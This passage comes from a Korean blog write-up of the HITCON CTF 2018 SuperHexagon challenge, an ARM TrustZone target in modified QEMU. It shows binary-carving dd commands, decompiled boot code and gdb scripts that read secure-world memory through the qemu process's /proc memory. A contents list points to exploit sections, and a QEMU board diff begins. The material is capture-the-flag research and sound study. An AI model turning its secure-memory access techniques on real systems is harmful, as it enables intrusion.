초기화한다.\nExtracting EL1, S-EL1, EL2 binaries #!/bin/sh dd if=./bios.bin of=EL1.out bs=1024 skip=704 count=64 dd if=./bios.bin of=SEL1.out bs=1024 skip=128 count=576 dd if=./bios.bin of=EL2.out bs=1024 skip=64 count=64 이제 EL1을 분석할 수 있게 되었다.\nvoid Reset(void) { ulong uVar1; ttbr0_el1 = 0x1000; ttbr1_el1 = 0x4000; tcr_el1 = 0x6080100010; InstructionSynchronizationBarrier(); uVar1 = sctlr_el1; sctlr_el1 = uVar1 | 1; InstructionSynchronizationBarrier(); /* WARNING: Treating indirect jump as call */ (*(code *)\u0026LAB_ffffffffc0008000)(); return; } 여러 시스템 레지스터를 세팅하는 것을 확인할 수 있다.\nQWORD_00001000 XREF[4]: FUN_00008434:0000846c (*) , FUN_0000c140:0000c1c4 (*) , FUN_0000c140:0000c1d4 (*) , FUN_0000c5dc:0000c630 (*) 00001000 03 20 00 dq 2003h 00 00 00 00 00 0x1000에는 위와 같은 값이 있다.\nTCR_ELx structure \u0026 gdbscript 전에 정리했었던 arm manual에서 두 개의 VA ranges를 지원하기 위해 TTBR0, TTBR1를 이용한다고 했었다. 그리고 이 두 개의 VA ranges에 대해서 각자에 TCR의 TxSz로 범위가 지정된다고 했었다. 이를 기반으로 gdbscript로 파싱하는 스크립트를 작성해서 명령을 추가했다.\nimport gdb class TCR_EL1(gdb.Command): def __init__(self): super(TCR_EL1, self).__init__(\"tcr_el1\", gdb.COMMAND_USER) def invoke(self, arg, from_tty): arg = arg.split() if len(arg) == 1: tcr = int(arg[0],16) elif len(arg) == 0: tcr = int(gdb.parse_and_eval('$TCR_EL1')) else: print(\"usuage: tcr_el1 [value (optional)]\") return T0SZ = tcr \u00260b111111 T1SZ = tcr \u003e\u003e 16 T1SZ \u0026= 0b111111 TG1 = int((tcr\u003e\u003e 30) \u0026 0b11) granule_bits = {0b01: 14, 0b10: 12, 0b11: 16}[TG1] print(\"T0:\",hex(0),'~',hex(2 ** (64-T0SZ)-1)) print(\"T1:\",hex(0x10000000000000000 - 2 ** (64-T1SZ)),'~',hex(0xffffffffffffffff)) print('granule_bits:',granule_bits) TCR_EL1() 이러한 범위로 이용되는 것을 확인했다.\nTTBR이 가리키고 있는 물리 메모리 영역을 읽어야한다. qemu에선 gdb-stub을 제공해줘서 monitor 명령어를 이용해서 물리 메모리를 읽을 수 있다.\naddress-space: memory 0000000000000000-ffffffffffffffff (prio -1, i/o): system 0000000004000000-0000000007ffffff (prio 0, romd): hitcon.flash1 0000000009000000-0000000009000fff (prio 0, i/o): pl011 0000000040000000-00000000ffffffff (prio 0, ram): mach-hitcon.ram address-space: I/O 0000000000000000-000000000000ffff (prio 0, i/o): io address-space: cpu-secure-memory-0 0000000000000000-ffffffffffffffff (prio 0, i/o): secure-memory 0000000000000000-0000000003ffffff (prio 0, romd): hitcon.flash0 0000000000000000-ffffffffffffffff (prio -1, i/o): system 0000000004000000-0000000007ffffff (prio 0, romd): hitcon.flash1 0000000009000000-0000000009000fff (prio 0, i/o): pl011 0000000040000000-00000000ffffffff (prio 0, ram): mach-hitcon.ram 000000000e000000-000000000effffff (prio 0, ram): hitcon.secure-ram address-space: cpu-memory-0 0000000000000000-ffffffffffffffff (prio -1, i/o): system 0000000004000000-0000000007ffffff (prio 0, romd): hitcon.flash1 0000000009000000-0000000009000fff (prio 0, i/o): pl011 0000000040000000-00000000ffffffff (prio 0, ram): mach-hitcon.ram 그런데 메모리 region을 보면 cpu-memory-0를 제외하고는 모두 secure-memory-0의 subregion으로 존재한다.\nReading a secure memory \u0026 gdbscript 각자의 EL에서 디버깅을 할텐데 해당 EL에선 더 상위 EL의 메모리를 읽기 힘들다. gdbstub에서 xp라는 명령으로 물리메모리에 액세스가 가능해서 편하게 물리메모리 영역을 덤프할 수 있다. 근데 문제는 Secure world의 메모리는 전혀 읽지 못한다는 점이다. 이는 qemu가 secure world가 메모리 격리를 고려해서 NS 비트가 세팅되지 않았을때 secure world 메모리를 읽지 못하도록 구현한 것으로 보인다. 전체 Secure/Non-secure world의 모든 물리 메모리를 접근하고 덤프하는 툴이 있으면 분석하기 편할 것 같아서 만들기로 결정했다.\n다른 오픈소스 프로젝트들을 참고해서 arm64의 secure memory에 대한 물리 메모리 읽기를 어떤 방식으로 구현했는지 확인했다. 이를 바탕으로 직접 gdbscript를 작성해서 물리 메모리를 확인할 수 있는 명령어 지원을 추가했다.\nimport gdb import re import psutil import struct class CPSR(gdb.Command): def __init__(self): super(CPSR, self).__init__(\"cpsr\", gdb.COMMAND_USER) def invoke(self, arg, from_tty): cpsr = (int(gdb.parse_and_eval(\"$cpsr\"))) mode = cpsr \u0026 0b1111 is_thumb = (cpsr \u003e\u003e 4)\u00261 IRQ = (cpsr \u003e\u003e 5)\u00261 FIQ = (cpsr \u003e\u003e 6)\u00261 cond = (cpsr \u003e\u003e 27)\u00260b1111 re = '' if 0b0000 == mode: re += 'EL0t' # SP_EL0 elif 0b0100 == mode: re += 'EL1t' # SP_EL0 elif 0b0101 == mode: re += 'EL1h' # SP_EL1 elif 0b1000 == mode: re += 'EL2t' # SP_EL0 elif 0b1001 == mode: re += 'EL2h' # SP_EL2 elif 0b1100 == mode: re += 'EL3t' # SP_EL0 elif 0b1101 == mode: re += 'EL3h' # SP_EL3 else: re += 'UNK' re += '| ' if IRQ: re += 'IRQ_MASKED | ' elif FIQ: re += 'FIQ_MASKED | ' if is_thumb: re += 'THUMB_MODE | ' re += f'COND_{hex(cond)[2:]}' print(re) import gdb class TCR_EL1(gdb.Command): def __init__(self): super(TCR_EL1, self).__init__(\"tcr_el1\", gdb.COMMAND_USER) def invoke(self, arg, from_tty): arg = arg.split() if len(arg) == 1: tcr = int(arg[0],16) elif len(arg) == 0: tcr = gdb.parse_and_eval('$TCR_EL1') else: print(\"usuage: tcr_el1 [value (optional)]\") return T0SZ = tcr \u00260b111111 T1SZ = tcr \u003e\u003e 16 T1SZ \u0026= 0b111111 T1SZ = int(T1SZ) print(\"T0:\",hex(0),'~',hex(2 ** (64-T0SZ)-1)) print(\"T1:\",hex(0x10000000000000000 - 2 ** (64-T1SZ)),'~',hex(0xffffffffffffffff)) TCR_EL1() class QEMU_SUPPORT(gdb.Command): address_space = { 'cpu-memory-0':{ 'system' : { 'hitcon.flash1' : {'start' : 0x000000004000000, 'end' : 0x000000007ffffff}, 'pl011' : {'start' : 0x0000000009000000, 'end' : 0x0000000009000fff}, 'mach-hitcon.ram' : {'start' : 0x0000000040000000, 'end' : 0x0000000ffffffff}, } }, 'cpu-secure-memory-0': { 'hitcon.flash0' : {'start' : 0x0000000000000000, 'end' : 0x0000000003ffffff}, 'system' : { 'hitcon.flash1' : {'start' : 0x000000004000000, 'end' : 0x000000007ffffff}, 'pl011' : {'start' : 0x0000000009000000, 'end' : 0x0000000009000fff}, 'mach-hitcon.ram' : {'start' : 0x0000000040000000, 'end' : 0x0000000ffffffff}, }, 'hitcon.secure-ram' : {'start' : 0x000000000e000000, 'end' : 0x000000000effffff} } } # monitor info mtree @staticmethod def get_remote_pid(proc_name): pids = [] for process in psutil.process_iter(): if proc_name in process.name(): pids.append(process.pid) if len(pids) != 1: return False return pids[0] def __init__(self): super(QEMU_SUPPORT, self).__init__(\"qemu_support\", gdb.COMMAND_USER) pid = self.get_remote_pid('qemu-system-aarch64') if pid != False: self.pid = pid def read_memory(self, addr, length): gdb.selected_inferior().read_memory(addr, length).tobytes() def find_region_recursive(self, addr): def find_region_step(obj, key): assert type(obj) == type({}) if 'start' in obj and 'end' in obj: if addr \u003e= obj['start'] and addr \u003c= obj['end']: return key else: return False else: for i in obj: if find_region_step(obj[i], i) != False: return i return False return (find_region_step(QEMU_SUPPORT.address_space, '')) def read_phys(self, addr, length): def slow_path(): ret = gdb.execute(f\"monitor gpa2hva {addr}\", to_string=True) r = re.search(\"is (0x[0-9a-f]+)\", ret) if r: host_va = int(r.group(1),16) with open(f'/proc/{self.pid}/mem','rb') as f: f.seek(host_va) data = f.read(length) return data else: print('Err read_phys() -\u003e slow_path()') def fast_path(): gdb.execute(f'monitor xp/{length//8}xg {addr}') return True reg = self.find_region_recursive(addr) # secure mem or non-secure? if reg == 'cpu-secure-memory-0': return slow_path() elif reg == 'cpu-memory-0': return fast_path() else: print(\"Err find_region_recursive()\",reg) return # secure world can access non-secure mem as well as secure mem. def invoke(self, arg, from_tty): arg = arg.split() if len(arg) \u003e 0: if arg[0] == 'read_phys': if len(arg) \u003e 2: if arg[1].startswith('0x'): addr = int(arg[1],16) else: addr = int(arg[1],10) if arg[2].startswith('0x'): length = int(arg[2],16) else: length = int(arg[2],10) data = self.read_phys(addr, length*8) if data != True: self.qword_dump(data, addr,length) else: print(\"invalid args\") @staticmethod def qword_dump(data, addr, length): for i in range(length): if i%2==0: ad = hex(addr + i*0x8)[2:].rjust(16,'0') print(f'{ad}',end=': ') a = hex(struct.unpack(\"",
  "wordCount" : "24441",
  "inLanguage": "en",
  "datePublished": "2024-06-25T00:00:00Z",
  "dateModified": "2024-06-25T00:00:00Z",
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://msh1307.kr/blog/hitcon_2018_superhexagon/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "msh1307",
    "logo": {
      "@type": "ImageObject",
      "url": "https://msh1307.kr/favicon.ico"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header sticky-header">
    
    <script async src="https://www.googletagmanager.com/gtag/js?id=G-BR89V2WEC0"></script>
    <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());
    gtag('config', 'G-BR89V2WEC0');
    </script>
    <nav class="nav">
        <div class="logo">
            <a href="https://msh1307.kr" accesskey="h" title="msh1307 (Alt + H)">msh1307</a>
            <span class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </span>
        </div>
        <ul id="menu">
            <li>
                <a href="https://msh1307.kr/" title="Home">
                    <span>Home</span>
                </a>
            </li>
            <li>
                <a href="https://msh1307.kr/blog" title="Blog">
                    <span>Blog</span>
                </a>
            </li>
            <li>
                <a href="https://msh1307.kr/about" title="About">
                    <span>About</span>
                </a>
            </li>
            <li>
                <a href="https://msh1307.kr/search" title="Search (Alt &#43; /)" accesskey=/>
                    <span>Search</span>
                </a>
            </li>
            <li>
                <a href="https://msh1307.kr/categories" title="Categories">
                    <span>Categories</span>
                </a>
            </li>
            <li>
                <a href="https://msh1307.kr/tags" title="Tags">
                    <span>Tags</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="https://msh1307.kr">Home</a>&nbsp;»&nbsp;<a href="https://msh1307.kr/blog/">Blogs</a></div>
    <h1 class="post-title">
      HITCON CTF 2018 - SuperHexagon
    </h1>
    <div class="post-meta">


June 2024

</div>
  </header> <div class="toc">
    <details >
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">‎ Table of Contents</span>
        </summary>

        <div class="inner"><ul>
                <li>
                    <a href="#overview" aria-label="Overview">Overview</a><ul>
                        
                <li>
                    <a href="#debugging-environment" aria-label="Debugging environment">Debugging environment</a></li></ul>
                </li>
                <li>
                    <a href="#el0-non-secure-application" aria-label="EL0, Non-secure application">EL0, Non-secure application</a><ul>
                        
                <li>
                    <a href="#carving-an-elf-binary" aria-label="Carving an ELF binary">Carving an ELF binary</a></li>
                <li>
                    <a href="#exploit-code-flag" aria-label="Exploit code (flag)">Exploit code (flag)</a></li>
                <li>
                    <a href="#exploit-code-code-execution" aria-label="Exploit code (code execution)">Exploit code (code execution)</a></li></ul>
                </li>
                <li>
                    <a href="#reverse-engineering-bl1" aria-label="Reverse engineering BL1">Reverse engineering BL1</a><ul>
                        
                <li>
                    <a href="#cpsr-structure--gdbscript" aria-label="CPSR structure &amp;amp; gdbscript">CPSR structure &amp; gdbscript</a></li>
                <li>
                    <a href="#sctlr_elx-structure" aria-label="SCTLR_ELx structure">SCTLR_ELx structure</a></li>
                <li>
                    <a href="#identifying-exception-handlers" aria-label="Identifying exception handlers">Identifying exception handlers</a><ul>
                        
                <li>
                    <a href="#vbar_elx-structure" aria-label="VBAR_ELx structure">VBAR_ELx structure</a></li>
                <li>
                    <a href="#exception-vector-structure" aria-label="Exception vector structure">Exception vector structure</a></li></ul>
                </li>
                <li>
                    <a href="#extracting-el1-s-el1-el2-binaries" aria-label="Extracting EL1, S-EL1, EL2 binaries">Extracting EL1, S-EL1, EL2 binaries</a></li>
                <li>
                    <a href="#tcr_elx-structure--gdbscript" aria-label="TCR_ELx structure &amp;amp; gdbscript">TCR_ELx structure &amp; gdbscript</a></li>
                <li>
                    <a href="#reading-a-secure-memory--gdbscript" aria-label="Reading a secure memory &amp;amp; gdbscript">Reading a secure memory &amp; gdbscript</a></li></ul>
                </li>
                <li>
                    <a href="#el1-non-secure-kernel" aria-label="EL1, Non-secure Kernel">EL1, Non-secure Kernel</a><ul>
                        
                <li>
                    <a href="#exploit-code-flag-1" aria-label="Exploit code (flag)">Exploit code (flag)</a></li>
                <li>
                    <a href="#gaining-code-execution" aria-label="Gaining code execution">Gaining code execution</a></li>
                <li>
                    <a href="#exploit-code-code-execution-1" aria-label="Exploit code (code execution)">Exploit code (code execution)</a></li></ul>
                </li>
                <li>
                    <a href="#el2-virtual-machine-monitor" aria-label="EL2, Virtual machine monitor">EL2, Virtual machine monitor</a><ul>
                        
                <li>
                    <a href="#exploit-code-flag--code-execution" aria-label="Exploit code (flag &amp;amp; code execution)">Exploit code (flag &amp; code execution)</a></li></ul>
                </li>
                <li>
                    <a href="#exploring-the-secure-world" aria-label="Exploring the Secure world">Exploring the Secure world</a><ul>
                        
                <li>
                    <a href="#debugging-the-secure-world" aria-label="Debugging the Secure world">Debugging the Secure world</a></li>
                <li>
                    <a href="#analyzing-the-secure-monitor" aria-label="Analyzing the secure monitor">Analyzing the secure monitor</a></li>
                <li>
                    <a href="#analyzing-the-interaction-between-the-normal-world-and-the-secure-world" aria-label="Analyzing the Interaction Between the Normal World and the Secure World">Analyzing the Interaction Between the Normal World and the Secure World</a><ul>
                        
                <li>
                    <a href="#el0-review" aria-label="EL0 review">EL0 review</a></li>
                <li>
                    <a href="#el1-review" aria-label="EL1 review">EL1 review</a></li>
                <li>
                    <a href="#el2-review" aria-label="EL2 review">EL2 review</a></li>
                <li>
                    <a href="#s-el3" aria-label="S-EL3">S-EL3</a></li>
                <li>
                    <a href="#spsr_el3-structure--gdbscript" aria-label="SPSR_EL3 structure &amp;amp; gdbscript">SPSR_EL3 structure &amp; gdbscript</a></li>
                <li>
                    <a href="#aarch32-pe-modes" aria-label="AArch32 PE modes">AArch32 PE modes</a></li>
                <li>
                    <a href="#diving-into-bl1-again" aria-label="Diving into BL1 again">Diving into BL1 again</a></li></ul>
                </li>
                <li>
                    <a href="#secure-world-pagewalk-gdbscript" aria-label="Secure world pagewalk gdbscript">Secure world pagewalk gdbscript</a></li>
                <li>
                    <a href="#reverse-engineering-s-el1" aria-label="Reverse engineering S-EL1">Reverse engineering S-EL1</a><ul>
                        
                <li>
                    <a href="#reversing-the-binary-loader--s-el0-binary-extraction" aria-label="Reversing the binary loader &amp;amp; S-EL0 binary extraction">Reversing the binary loader &amp; S-EL0 binary extraction</a></li></ul>
                </li></ul>
                </li>
                <li>
                    <a href="#s-el0-secure-application" aria-label="S-EL0, Secure application">S-EL0, Secure application</a><ul>
                        
                <li>
                    <a href="#exploit-code-code-execution--flag" aria-label="Exploit code (code execution &amp;amp; flag)">Exploit code (code execution &amp; flag)</a></li></ul>
                </li>
                <li>
                    <a href="#s-el1-secure-kernel" aria-label="S-EL1, Secure kernel">S-EL1, Secure kernel</a><ul>
                        <ul>
                        
                <li>
                    <a href="#gaining-code-execution-1" aria-label="Gaining code execution">Gaining code execution</a></li>
                <li>
                    <a href="#enhancing-the-exploitation-stability" aria-label="Enhancing the exploitation stability">Enhancing the exploitation stability</a></li></ul>
                    
                <li>
                    <a href="#exploit-code-code-execution--flag-1" aria-label="Exploit code (code execution &amp;amp; flag)">Exploit code (code execution &amp; flag)</a></li></ul>
                </li>
                <li>
                    <a href="#s-el3-secure-monitor" aria-label="S-EL3, Secure monitor">S-EL3, Secure monitor</a><ul>
                        
                <li>
                    <a href="#exploit-code-code-execution--flag-2" aria-label="Exploit code (code execution &amp;amp; flag)">Exploit code (code execution &amp; flag)</a>
                </li>
            </ul>
            </li>
            </ul>
        </div>
    </details>
</div>

  <div class="post-content"><p>오랜만에 한꺼번에 블로그 글을 쓰게 되었다.
이번년도 초에 공부를 목적으로 superhexagon을 풀었다.
글에서 언급하는 background 내용은 다른 글에서 따로 정리되어있다.</p>
<h1 id="overview">Overview<a hidden class="anchor" aria-hidden="true" href="#overview">#</a></h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>diff <span style="color:#f92672">-</span>Naur <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#f92672">--</span>exclude<span style="color:#f92672">=</span>tests<span style="color:#e6db74">&#39; &#39;</span><span style="color:#f92672">--</span>exclude<span style="color:#f92672">=</span>roms<span style="color:#e6db74">&#39; &#39;</span><span style="color:#f92672">--</span>exclude<span style="color:#f92672">=</span>capstone<span style="color:#e6db74">&#39; &#39;</span><span style="color:#f92672">--</span>exclude<span style="color:#f92672">=</span>docs<span style="color:#960050;background-color:#1e0010">&#39;</span> ..<span style="color:#f92672">/</span>temp<span style="color:#f92672">/</span>qemu<span style="color:#f92672">-</span><span style="color:#ae81ff">3.0.0</span><span style="color:#f92672">/</span>hw<span style="color:#f92672">/</span>arm<span style="color:#f92672">/</span>hitcon.c qemu<span style="color:#f92672">/</span>hw<span style="color:#f92672">/</span>arm<span style="color:#f92672">/</span>hitcon.c
</span></span><span style="display:flex;"><span><span style="color:#f92672">---</span> ..<span style="color:#f92672">/</span>temp<span style="color:#f92672">/</span>qemu<span style="color:#f92672">-</span><span style="color:#ae81ff">3.0.0</span><span style="color:#f92672">/</span>hw<span style="color:#f92672">/</span>arm<span style="color:#f92672">/</span>hitcon.c	<span style="color:#ae81ff">1969</span><span style="color:#f92672">-</span><span style="color:#ae81ff">12</span><span style="color:#f92672">-</span><span style="color:#ae81ff">31</span> <span style="color:#ae81ff">16</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00.000000000</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">0800</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+++</span> qemu<span style="color:#f92672">/</span>hw<span style="color:#f92672">/</span>arm<span style="color:#f92672">/</span>hitcon.c	<span style="color:#ae81ff">2018</span><span style="color:#f92672">-</span><span style="color:#ae81ff">10</span><span style="color:#f92672">-</span><span style="color:#ae81ff">19</span> <span style="color:#ae81ff">10</span><span style="color:#f92672">:</span><span style="color:#ae81ff">49</span><span style="color:#f92672">:</span><span style="color:#ae81ff">59.412023642</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">0700</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">@@</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span> <span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">208</span> <span style="color:#960050;background-color:#1e0010">@@</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#960050;background-color:#1e0010">#</span>include <span style="color:#e6db74">&#34;qemu/osdep.h&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#960050;background-color:#1e0010">#</span>include <span style="color:#e6db74">&#34;qapi/error.h&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#960050;background-color:#1e0010">#</span>include <span style="color:#e6db74">&#34;qemu-common.h&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#960050;background-color:#1e0010">#</span>include <span style="color:#e6db74">&#34;cpu.h&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#960050;background-color:#1e0010">#</span>include <span style="color:#e6db74">&#34;hw/sysbus.h&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#960050;background-color:#1e0010">#</span>include <span style="color:#e6db74">&#34;hw/devices.h&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#960050;background-color:#1e0010">#</span>include <span style="color:#e6db74">&#34;hw/boards.h&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#960050;background-color:#1e0010">#</span>include <span style="color:#e6db74">&#34;hw/arm/arm.h&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#960050;background-color:#1e0010">#</span>include <span style="color:#e6db74">&#34;hw/misc/arm_integrator_debug.h&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#960050;background-color:#1e0010">#</span>include <span style="color:#e6db74">&#34;net/net.h&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#960050;background-color:#1e0010">#</span>include <span style="color:#e6db74">&#34;exec/address-spaces.h&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#960050;background-color:#1e0010">#</span>include <span style="color:#e6db74">&#34;sysemu/sysemu.h&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#960050;background-color:#1e0010">#</span>include <span style="color:#e6db74">&#34;qemu/error-report.h&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#960050;background-color:#1e0010">#</span>include <span style="color:#e6db74">&#34;hw/char/pl011.h&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#960050;background-color:#1e0010">#</span>include <span style="color:#e6db74">&#34;hw/loader.h&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#960050;background-color:#1e0010">#</span>include <span style="color:#e6db74">&#34;hw/intc/arm_gic_common.h&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> MemMapEntry {
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    hwaddr base;
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    hwaddr size;
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>} MemMapEntry;
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#66d9ef">enum</span> {
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    VIRT_FLASH,
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    VIRT_CPUPERIPHS,
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    VIRT_MEM,
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    VIRT_SECURE_MEM,
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    VIRT_UART,
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>};
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#960050;background-color:#1e0010">#</span>define RAMLIMIT_GB <span style="color:#ae81ff">3</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#960050;background-color:#1e0010">#</span>define <span style="color:#a6e22e">RAMLIMIT_BYTES</span> (RAMLIMIT_GB <span style="color:#f92672">*</span> <span style="color:#ae81ff">1024ULL</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">1024</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">1024</span>)
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">const</span> MemMapEntry memmap[] <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    <span style="color:#75715e">/* Space up to 0x8000000 is reserved for a boot ROM */</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    [VIRT_FLASH] <span style="color:#f92672">=</span>              {          <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x08000000</span> },
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    [VIRT_CPUPERIPHS] <span style="color:#f92672">=</span>         { <span style="color:#ae81ff">0x08000000</span>, <span style="color:#ae81ff">0x00020000</span> },
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    [VIRT_UART] <span style="color:#f92672">=</span>               { <span style="color:#ae81ff">0x09000000</span>, <span style="color:#ae81ff">0x00001000</span> },
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    [VIRT_SECURE_MEM] <span style="color:#f92672">=</span>         { <span style="color:#ae81ff">0x0e000000</span>, <span style="color:#ae81ff">0x01000000</span> },
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    [VIRT_MEM] <span style="color:#f92672">=</span>                { <span style="color:#ae81ff">0x40000000</span>, RAMLIMIT_BYTES },
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>};
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>valid_cpus[] <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    <span style="color:#a6e22e">ARM_CPU_TYPE_NAME</span>(<span style="color:#e6db74">&#34;hitcon&#34;</span>),
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>};
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">bool</span> <span style="color:#a6e22e">cpu_type_valid</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>cpu)
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>{
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    <span style="color:#66d9ef">int</span> i;
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    <span style="color:#66d9ef">for</span> (i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">ARRAY_SIZE</span>(valid_cpus); i<span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">strcmp</span>(cpu, valid_cpus[i]) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>            <span style="color:#66d9ef">return</span> true;
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>        }
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    }
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    <span style="color:#66d9ef">return</span> false;
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>}
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">create_one_flash</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>name, hwaddr flashbase,
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>                             hwaddr flashsize, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>file,
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>                             MemoryRegion <span style="color:#f92672">*</span>sysmem)
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>{
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    <span style="color:#75715e">/* Create and map a single flash device. We use the same
